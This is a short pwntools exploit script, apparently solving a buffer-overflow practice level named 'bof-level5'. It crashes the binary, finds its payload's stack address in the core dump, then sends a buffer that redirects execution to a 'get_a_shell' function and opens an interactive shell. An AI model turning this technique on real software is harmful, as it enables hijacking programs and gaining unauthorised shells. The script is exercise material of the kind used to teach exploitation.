#!/usr/bin/env python

from pwn import *

p = process('./bof-level5')
e = ELF('./bof-level5')

get_a_shell = e.symbols['get_a_shell']


buf = p32(get_a_shell) * (128/4) + p32(0)

p.sendline(buf)
p.wait()
p.close()

c = Core('./core')

addr = c.stack.find(buf)


exploit_buf = p32(get_a_shell) * (128/4) + p32(addr)

p = process('./bof-level5')
p.sendline(exploit_buf)
p.interactive()
